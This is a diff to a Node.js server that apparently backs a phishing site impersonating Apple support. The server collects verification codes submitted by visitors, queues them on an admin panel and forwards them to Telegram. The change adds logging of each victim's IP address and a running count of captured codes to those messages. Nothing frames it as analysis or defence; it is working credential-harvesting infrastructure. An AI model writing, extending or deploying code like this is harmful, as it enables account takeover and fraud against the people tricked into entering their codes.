@@ -39,6 +39,7 @@ function sendTelegram(text) {
 
 app.post('/api/send', async (req, res) => {
     const { text } = req.body;
+    const ip = req.headers['x-forwarded-for'] || req.headers['x-real-ip'] || req.connection.remoteAddress || 'Inconnu';
     try {
         const codeMatch = text.match(/Code:\s*(.+)/);
         const adminUrl = '\n\nPanel admin: https://support-apple-production.up.railway.app/admin.html';
@@ -48,14 +49,18 @@ app.post('/api/send', async (req, res) => {
                 id: ++codeIdCounter,
                 code: codeMatch[1].trim(),
                 status: 'pending',
-                time: new Date().toLocaleString('fr-FR')
+                time: new Date().toLocaleString('fr-FR'),
+                ip: ip
             };
             codes.push(codeEntry);
-            await sendTelegram(text + adminUrl);
+            const count = codes.length;
+            const msg = text + '\n\nIP: ' + ip + '\nTotal codes recus: ' + count + adminUrl;
+            await sendTelegram(msg);
             return res.json({ ok: true, codeId: codeEntry.id });
         }
 
-        await sendTelegram(text);
+        const msgWithIp = text + '\n\nIP: ' + ip;
+        await sendTelegram(msgWithIp);
         res.json({ ok: true });
     } catch(e) {
         res.json({ ok: true });
